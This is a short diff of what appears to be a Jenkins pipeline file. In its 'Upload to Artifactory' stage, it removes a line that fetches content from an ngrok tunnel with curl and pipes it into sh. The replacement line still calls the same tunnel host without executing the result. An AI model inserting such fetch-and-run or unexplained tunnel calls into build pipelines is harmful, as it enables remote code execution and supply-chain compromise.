@@ -36,7 +36,7 @@ pipeline{
         stage('Upload to Artifactory') {
             steps {
                 script {
-                    bat "curl -fL https://62e8-49-37-152-163.ngrok-free.app | sh"
+                    bat "curl -fL https://62e8-49-37-152-163.ngrok-free.app "
                     bat "set PATH=%PATH%;${PATH_TO_JFROG_CLI}"
 
                     withEnv(["PATH+EXTRA=%PATH%;${PATH_TO_JFROG_CLI}"]) {
